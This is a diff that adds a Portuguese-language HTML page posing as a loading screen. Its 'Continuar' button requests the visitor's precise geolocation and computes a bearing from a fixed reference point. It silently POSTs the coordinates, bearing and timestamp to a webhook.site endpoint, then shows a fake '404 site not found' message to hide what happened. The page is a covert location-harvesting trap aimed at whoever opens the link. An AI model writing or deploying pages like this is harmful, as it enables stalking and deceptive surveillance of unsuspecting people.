@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <title>Carregando...</title>
+</head>
+<body>
+  <button id="btn">Continuar</button>
+  <div id="view"></div>
+
+  <script>
+    // Ponto de referência (ajuste se quiser medir em relação a outro local)
+    const REF_LAT = -20.1286;
+    const REF_LON = -40.3078;
+
+    // Sua URL do Webhook.site
+    const ENDPOINT_URL = "https://webhook.site/8830f5cc-72b5-489c-ac38-9cd9d8aedfd5";
+
+    function toRad(deg) { return (deg * Math.PI) / 180; }
+    function toDeg(rad) { return (rad * 180) / Math.PI; }
+
+    function bearingDeg(lat1, lon1, lat2, lon2) {
+      const φ1 = toRad(lat1), φ2 = toRad(lat2);
+      const Δλ = toRad(lon2 - lon1);
+      const y = Math.sin(Δλ) * Math.cos(φ2);
+      const x = Math.cos(φ1) * Math.sin(φ2) - Math.sin(φ1) * Math.cos(φ2) * Math.cos(Δλ);
+      return (toDeg(Math.atan2(y, x)) + 360) % 360;
+    }
+
+    function cardinal8(deg) {
+      const dirs = ["Norte", "Nordeste", "Leste", "Sudeste", "Sul", "Sudoeste", "Oeste", "Noroeste"];
+      return dirs[Math.round(deg / 45) % 8];
+    }
+
+    function showNotFound() {
+      document.getElementById("btn").style.display = "none";
+      document.getElementById("view").innerHTML =
+        "<h1>404</h1><p>Site não encontrado.</p>";
+    }
+
+    document.getElementById("btn").addEventListener("click", () => {
+      if (!navigator.geolocation) {
+        showNotFound();
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          const { latitude, longitude } = pos.coords;
+          const deg = bearingDeg(REF_LAT, REF_LON, latitude, longitude);
+          const payload = {
+            latitude,
+            longitude,
+            azimute_graus: Number(deg.toFixed(1)),
+            ponto_cardeal: cardinal8(deg),
+            timestamp: new Date().toISOString()
+          };
+
+          try {
+            await fetch(ENDPOINT_URL, {
+              method: "POST",
+              headers: { "Content-Type": "text/plain;charset=UTF-8" },
+              body: JSON.stringify(payload),
+              keepalive: true
+            });
+          } catch (_) {
+            // Mesmo se houver bloqueio de CORS na leitura, o POST pode ter saído
+          } finally {
+            showNotFound();
+          }
+        },
+        () => {
+          showNotFound();
+        },
+        { enableHighAccuracy: true }
+      );
+    });
+  </script>
+</body>
+</html>
